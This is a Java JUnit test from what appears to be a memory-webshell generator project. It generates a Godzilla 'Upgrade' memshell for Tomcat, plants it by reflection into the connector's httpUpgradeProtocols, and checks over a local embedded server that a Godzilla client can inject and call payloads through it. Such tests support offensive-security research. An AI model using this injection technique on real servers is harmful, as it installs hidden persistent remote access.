package com.reajason.javaweb.memshell.shelltool.godzilla;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.godzilla.GodzillaManager;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.utils.ClassDefiner;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.startup.Tomcat;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * 使用期验证：把生成的 Upgrade 内存马挂到内嵌 Tomcat 连接器的 httpUpgradeProtocols 上，
 * 用真实的哥斯拉协议客户端（tools:godzilla）经 {@code Connection: Upgrade} 请求驱动。
 *
 * @author ReaJason
 */
class GodzillaUpgradeEmbeddedTomcatTest {

    private static final String PASS = "passUpgrade";
    private static final String KEY = "keyUpgrade";
    private static final String HEADER_VALUE = "Firefox";

    @TempDir
    Path baseDir;

    private Tomcat tomcat;
    private Connector connector;
    private String url;

    @BeforeEach
    void startTomcat() throws Exception {
        Files.createDirectories(baseDir.resolve("webapp"));
        tomcat = new Tomcat();
        tomcat.setBaseDir(baseDir.resolve("tomcat").toString());
        tomcat.setPort(0);
        connector = tomcat.getConnector();
        tomcat.addWebapp("", baseDir.resolve("webapp").toString());
        tomcat.start();
        url = "http://127.0.0.1:" + connector.getLocalPort();
    }

    @AfterEach
    void stopTomcat() throws Exception {
        if (tomcat != null) {
            tomcat.stop();
            tomcat.destroy();
        }
    }

    @Test
    void runsPayloadOverUpgradeProtocol() throws Exception {
        MemShellResult result = new MemShellGenerator().generate(
                ShellConfig.builder()
                        .server(Server.Tomcat)
                        .shellTool(ShellTool.Godzilla)
                        .shellType(ShellType.UPGRADE)
                        .build(),
                InjectorConfig.builder().build(),
                GodzillaConfig.builder()
                        .pass(PASS)
                        .key(KEY)
                        .headerName("User-Agent")
                        .headerValue(HEADER_VALUE)
                        .build());
        registerUpgradeProtocol(result);

        try (GodzillaManager manager = GodzillaManager.builder()
                .entrypoint(url + "/test")
                .pass(PASS)
                .key(KEY)
                .header("User-Agent", HEADER_VALUE)
                .upgradeProtocol(result.getShellClassName())
                .build()) {
            assertTrue(manager.start(), "payload class 注入失败");
            assertTrue(manager.test(), "payload 调用没有回显");
        }
    }

    @SuppressWarnings("unchecked")
    private void registerUpgradeProtocol(MemShellResult result) throws Exception {
        Object protocolHandler = connector.getProtocolHandler();
        Field field = null;
        Class<?> clazz = protocolHandler.getClass();
        while (clazz != Object.class && field == null) {
            try {
                field = clazz.getDeclaredField("httpUpgradeProtocols");
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        assertNotNull(field, "httpUpgradeProtocols not found");
        field.setAccessible(true);
        Map<String, Object> protocols = (Map<String, Object>) field.get(protocolHandler);
        protocols.put(result.getShellClassName(), ClassDefiner.defineClass(result.getShellBytes()).getDeclaredConstructor().newInstance());
    }
}
